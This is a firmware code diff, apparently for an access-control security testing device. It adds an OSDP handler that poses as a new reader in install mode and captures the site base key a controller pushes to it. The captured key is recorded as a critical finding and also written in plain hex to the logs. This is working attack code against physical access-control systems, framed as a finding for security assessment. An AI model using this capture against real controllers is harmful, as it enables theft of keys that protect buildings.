@@ -17,6 +17,7 @@
 #include <soc/soc_caps.h>
 
 #include "tick_board.h"
+#include "tick_findings.h"
 #include "tick_default_config.h"
 #include "tick_osdp.h"
 #include "tick_utils.h"
@@ -210,6 +211,33 @@ int osdp_serial_recv_func(void *data, uint8_t *buf, int len) {
 int osdp_pd_event_handler(void *data, struct osdp_cmd *cmd) {
   (void)(data);
   if (cmd == NULL) return -1;
+
+  if (cmd->id == OSDP_CMD_KEYSET) {
+    // This is the install mode attack landing.
+    //
+    // With no SCBK configured, libosdp puts this peripheral in install mode
+    // and completes the secure channel using SCBK-D, the default key from the
+    // specification. A controller that was left in install mode will then
+    // push the site's real base key to what it believes is a new reader - and
+    // libosdp hands it straight to this callback.
+    //
+    // Recovering it proves the controller hands its key to anything that asks.
+    char hex[33];
+    size_t n = cmd->keyset.length;
+    if (n > 16) n = 16;
+    for (size_t i = 0; i < n; i++) {
+      hex[i * 2] = c2h((unsigned char)(cmd->keyset.data[i] >> 4));
+      hex[i * 2 + 1] = c2h((unsigned char)(cmd->keyset.data[i] & 0x0F));
+    }
+    hex[n * 2] = '\0';
+
+    tick_record_finding("install_mode_key_disclosed", hex, TICK_SEVERITY_CRITICAL,
+                        true, (uint8_t)address);
+    append_log("osdp", String("controller disclosed base key: ") + hex);
+    output_debug_string(F("OSDP: controller handed over its key"));
+    return 0;
+  }
+
   append_log("osdp", String("command ") + String((int)cmd->id) + " received");
   return 0;
 }
